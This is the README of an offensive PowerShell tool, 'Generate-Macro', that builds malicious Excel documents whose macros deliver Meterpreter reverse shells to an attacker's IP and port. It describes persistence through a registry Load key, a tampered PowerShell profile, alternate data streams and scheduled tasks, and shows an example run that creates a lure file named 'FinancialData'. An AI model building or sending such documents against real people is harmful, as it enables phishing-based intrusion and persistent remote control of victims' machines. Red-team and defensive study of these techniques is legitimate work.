<h2>Coded by Matt Nelson (@enigma0x3)</h2>

<h4>SYNOPSIS</h4>
Generate-Macro is a standalone PowerShell script that will generate a malicious Microsoft Office document with a specified payload and persistence method.

[!] This script will temporarily disable 2 macro security settings while creating the document.
[!] The idea is to generate your malicious document on a development box you OWN and use that document to send to a target.

<h4>DESCRIPTION</h4>
This script will generate malicious Microsoft Excel Documents that contain VBA macros. 
This script will prompt you for an IP address and port (you will receive your shell at this address and port) and the name of the malicious document. From there, the script will then prompt you to choose from a menu of different attacks, all with different persistence methods. Once an attack is chosen, it will then prompt you for your payload type. Currently, only HTTP and HTTPS are supported.

When naming the document, do not include a file extension.

<i>These attacks use Invoke-Shellcode, which was created by Matt Graeber. Follow him on Twitter --> <a href="https://www.twitter.com/mattifestation" target="_blank">@mattifestation</a></i>

<h4>ATTACK TYPES</h4><ul>
<li>Meterpreter Shell with Logon Persistence: <br />
This attack delivers a meterpreter shell and then persists in the registry by creating a hidden .vbs file in C:\Users\Public and then creates a registry key in HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load that will execute the .vbs file on login.</li>

<li>Meterpreter Shell with PowerShell Profile Persistence: <br />
This attack requires the target user to have Administrator privileges but is quite creative. 
It will deliver you a shell and then drop a malicious .vbs file in C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs. Once dropped, it creates an infected PowerShell Profile file in C:\Windows\SysNative\WindowsPowerShell\v1.0\ and then creates a registry key in HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load that will execute Powershell.exe on startup. 
Since the PowerShell profile loads automatically when Powershell.exe is invoked, your code is executed automatically.</li>

<li>Meterpreter Shell with Alternate Data Stream Persistence: <br />
This attack will give you a shell and then persists by creating 2 alternate data streams attached to the AppData
folder. It then creates a registry key that parses the Alternate Data Streams and runs the Base64 encoded payload.</li>

<li>Meterpreter Shell with Scheduled Task Persistence: <br />
This attack will give you a shell and then persist by creating a scheduled task with the action set to
the set payload.</li>

<h4>EXAMPLE</h4>
```
PS> ./Generate-Macro.ps1
Enter IP Address: 10.0.0.10
Enter Port Number: 1111
Enter the name of the document (Do not include a file extension): FinancialData

--------Select Attack---------
1. Meterpreter Shell with Logon Persistence
2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
3. Meterpreter Shell with Microsoft Outlook Email Persistence
------------------------------
Select Attack Number & Press Enter: 1

--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------
Select Payload Number & Press Enter: 1
Saved to file C:\Users\Malware\Desktop\FinancialData.xls
```
